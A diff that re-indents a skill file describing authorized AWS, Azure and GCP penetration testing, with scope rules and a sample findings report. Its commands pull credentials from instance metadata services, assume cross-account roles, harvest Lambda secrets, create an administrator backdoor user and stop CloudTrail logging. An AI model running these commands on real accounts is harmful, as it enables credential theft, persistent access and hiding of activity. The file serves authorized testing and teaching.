@@ -1,13 +1,13 @@
 ---
 name: conducting-cloud-penetration-testing
 description: 'This skill outlines methodologies for performing authorized penetration
-  testing against AWS, Azure, and GCP cloud environments. It covers understanding
-  the shared responsibility model for testing scope, leveraging cloud-specific attack
-  tools like Pacu and ScoutSuite, exploiting IAM misconfigurations, testing for SSRF
-  to cloud metadata services, and reporting findings aligned to MITRE ATT&CK Cloud
-  matrix.
+ testing against AWS, Azure, and GCP cloud environments. It covers understanding
+ the shared responsibility model for testing scope, leveraging cloud-specific attack
+ tools like Pacu and ScoutSuite, exploiting IAM misconfigurations, testing for SSRF
+ to cloud metadata services, and reporting findings aligned to MITRE ATT&CK Cloud
+ matrix.
 
-  '
+ '
 domain: cybersecurity
 subdomain: cloud-security
 tags:
@@ -79,19 +79,19 @@ Testing Window: 2025-02-24 08:00 UTC to 2025-02-28 18:00 UTC
 Authorization: Signed by CISO, dated 2025-02-20
 
 IN SCOPE:
-  - IAM users, roles, policies, and cross-account trust
-  - EC2 instances, security groups, and network ACLs
-  - S3 bucket policies and data access controls
-  - Lambda functions, API Gateway endpoints
-  - RDS/DynamoDB access controls and encryption
-  - EKS cluster RBAC and network policies
-  - CloudTrail, Config, and monitoring gaps
+ - IAM users, roles, policies, and cross-account trust
+ - EC2 instances, security groups, and network ACLs
+ - S3 bucket policies and data access controls
+ - Lambda functions, API Gateway endpoints
+ - RDS/DynamoDB access controls and encryption
+ - EKS cluster RBAC and network policies
+ - CloudTrail, Config, and monitoring gaps
 
 OUT OF SCOPE:
-  - AWS managed service internals (RDS engine, Lambda runtime)
-  - DDoS attacks or volumetric testing
-  - Physical infrastructure or hypervisor attacks
-  - Social engineering of AWS support
+ - AWS managed service internals (RDS engine, Lambda runtime)
+ - DDoS attacks or volumetric testing
+ - Physical infrastructure or hypervisor attacks
+ - Social engineering of AWS support
 
 EMERGENCY CONTACT: security-ops@company.com, +1-555-0199
 ```
@@ -112,13 +112,13 @@ cloudfox aws --profile target-account all-checks
 
 # Enumerate public S3 buckets
 for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
-  aws s3api get-bucket-policy-status --bucket $bucket 2>/dev/null | grep -q "true" && echo "PUBLIC: $bucket"
+ aws s3api get-bucket-policy-status --bucket $bucket 2>/dev/null | grep -q "true" && echo "PUBLIC: $bucket"
 done
 
 # Check for IMDS v1 (vulnerable to SSRF)
 aws ec2 describe-instances \
-  --query 'Reservations[*].Instances[*].[InstanceId,MetadataOptions.HttpTokens]' \
-  --output table
+ --query 'Reservations[*].Instances[*].[InstanceId,MetadataOptions.HttpTokens]' \
+ --output table
 ```
 
 ### Step 3: IAM Privilege Escalation Testing
@@ -157,17 +157,17 @@ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 # Test for IMDS v2 (requires token - more secure)
 TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
-  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+ -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
 curl -H "X-aws-ec2-metadata-token: $TOKEN" \
-  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 # Azure IMDS equivalent
 curl -H "Metadata:true" \
-  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+ "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
 
 # GCP metadata service
 curl -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+ "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
 ```
 
 ### Step 5: Lateral Movement and Data Access
@@ -180,16 +180,16 @@ aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal
 
 # Test cross-account assumption
 aws sts assume-role \
-  --role-arn arn:aws:iam::987654321098:role/CrossAccountRole \
-  --role-session-name pentest-session
+ --role-arn arn:aws:iam::987654321098:role/CrossAccountRole \
+ --role-session-name pentest-session
 
 # Enumerate accessible S3 data with stolen credentials
 aws s3 ls --recursive s3://target-bucket/ --summarize
 
 # Check Lambda environment variables for secrets
 aws lambda list-functions --query 'Functions[*].[FunctionName]' --output text | while read fn; do
-  aws lambda get-function-configuration --function-name "$fn" \
-    --query 'Environment.Variables' --output json 2>/dev/null
+ aws lambda get-function-configuration --function-name "$fn" \
+ --query 'Environment.Variables' --output json 2>/dev/null
 done
 ```
 
@@ -202,7 +202,7 @@ Test whether the organization's monitoring detects persistence mechanisms such a
 aws iam create-user --user-name pentest-backdoor
 aws iam create-access-key --user-name pentest-backdoor
 aws iam attach-user-policy --user-name pentest-backdoor \
-  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+ --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 
 # Test: Disable CloudTrail (verify GuardDuty alerts)
 aws cloudtrail stop-logging --name management-trail
@@ -214,7 +214,7 @@ aws cloudtrail stop-logging --name management-trail
 # CLEANUP: Remove all persistence artifacts after testing
 aws iam delete-access-key --user-name pentest-backdoor --access-key-id AKIAEXAMPLE
 aws iam detach-user-policy --user-name pentest-backdoor \
-  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+ --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 aws iam delete-user --user-name pentest-backdoor
 aws cloudtrail start-logging --name management-trail
 ```
@@ -270,33 +270,33 @@ Methodology: MITRE ATT&CK Cloud + OWASP Cloud Testing Guide
 Tester: Security Team - Authorized Engagement
 
 EXECUTIVE SUMMARY:
-  Starting with read-only developer credentials, the assessment achieved
-  full administrative access to the production account within 3 hours through
-  an IAM privilege escalation chain. 47 findings identified across 7 ATT&CK tactics.
+ Starting with read-only developer credentials, the assessment achieved
+ full administrative access to the production account within 3 hours through
+ an IAM privilege escalation chain. 47 findings identified across 7 ATT&CK tactics.
 
 CRITICAL FINDINGS:
 [PT-001] IAM Privilege Escalation via iam:CreatePolicyVersion
-  ATT&CK: T1098.001 (Account Manipulation: Additional Cloud Credentials)
-  Severity: CRITICAL
-  Starting Point: Developer role with iam:CreatePolicyVersion permission
-  Impact: Full administrative access to all account resources
-  Evidence: Created policy version granting iam:* and s3:* to test role
-  Remediation: Remove iam:CreatePolicyVersion from developer roles, add permission boundary
+ ATT&CK: T1098.001 (Account Manipulation: Additional Cloud Credentials)
+ Severity: CRITICAL
+ Starting Point: Developer role with iam:CreatePolicyVersion permission
+ Impact: Full administrative access to all account resources
+ Evidence: Created policy version granting iam:* and s3:* to test role
+ Remediation: Remove iam:CreatePolicyVersion from developer roles, add permission boundary
 
 [PT-002] SSRF to IMDS Credential Theft
-  ATT&CK: T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)
-  Severity: CRITICAL
-  Starting Point: Web application URL parameter vulnerable to SSRF
-  Impact: Extracted IAM role credentials with S3 and Lambda access
-  Remediation: Enforce IMDSv2, apply WAF rules for SSRF, restrict IAM role scope
+ ATT&CK: T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)
+ Severity: CRITICAL
+ Starting Point: Web application URL parameter vulnerable to SSRF
+ Impact: Extracted IAM role credentials with S3 and Lambda access
+ Remediation: Enforce IMDSv2, apply WAF rules for SSRF, restrict IAM role scope
 
 FINDING SUMMARY BY MITRE ATT&CK TACTIC:
-  Initial Access:       4 findings
-  Execution:            3 findings
-  Persistence:          6 findings
-  Privilege Escalation: 8 findings (3 Critical)
-  Defense Evasion:      5 findings
-  Credential Access:    7 findings
-  Discovery:           14 findings
-  Total:               47 findings
+ Initial Access: 4 findings
+ Execution: 3 findings
+ Persistence: 6 findings
+ Privilege Escalation: 8 findings (3 Critical)
+ Defense Evasion: 5 findings
+ Credential Access: 7 findings
+ Discovery: 14 findings
+ Total: 47 findings
 ```
